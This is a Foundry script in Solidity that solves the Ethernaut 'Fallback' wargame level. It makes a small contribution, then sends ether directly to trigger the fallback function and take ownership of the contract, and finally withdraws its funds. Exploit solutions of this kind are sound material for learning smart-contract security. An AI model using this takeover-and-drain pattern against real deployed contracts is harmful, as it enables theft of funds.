pragma solidity ^0.8.0;

import {Fallback} from "lib/ethernaut/01Fallback.sol";
import {Script} from "forge-std/Script.sol";

contract Attack is Script {
    // creating and submitting instance are done manually on the frontend
    address instanceAddress = 0x1166da1C7eaf544E2cd47D4aeACFABDC89c7D81D;
    Fallback instance = Fallback(payable(instanceAddress));

    function run() public {
        vm.startBroadcast();

        instance.contribute{value: 10 wei}();
        (bool success, ) = address(instance).call{value: 10 wei}("");
        require(success, "Failed to transfer ether");
        instance.withdraw();

        vm.stopBroadcast();
    }
}
